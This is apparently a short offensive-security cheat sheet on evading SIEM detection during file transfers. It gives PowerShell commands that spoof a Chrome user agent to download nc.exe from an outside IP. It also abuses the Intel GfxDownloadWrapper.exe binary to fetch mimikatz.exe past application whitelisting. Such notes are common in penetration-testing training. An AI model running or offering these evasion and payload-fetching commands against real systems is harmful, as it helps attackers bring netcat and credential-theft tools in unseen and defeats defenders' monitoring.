---
# Detection and Evasion
---
## File Transfer DaE
**A lot of SIEM (Security Information and Event Management) are  checking    ** `user-agents` **to detect sus traffic.** But `user-agents` are not only used to identify web browsers, but anything acting as HTTP client and connecting to a web server via HTTP can have user agent string (like `cURL`, custom `Python` script or common tools like `sqlmap` and `nmap`). So File transfers could be detected. 
### Evasion Techniques
#### Changing User Agent:
1. **Listing out User Agents**
```powershell
PS C:\carnifex17>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
2. **Request with Chrome User Agent**
```powershell
PS C:\carnifex17> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\carnifex17> Invoke-WebRequest http://13.13.13.13/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
#### LOLBAS / GTFOBins
Application whitelisting may prevent you from using PowerShell or Netcat, but not from using `Living Off the Land` Binaries. As example LOLBIN is the Intel Graphics Driver for Windows 10(GfxDownloadWrapper.exe), which could be used to file transfer
1. **Transferring File with GfxDownloadWrapper.exe**
```powershell
PS C:\carnifex17> GfxDownloadWrapper.exe "http://13.13.13.13/mimikatz.exe" "C:\Temp\nc.exe"
```

---
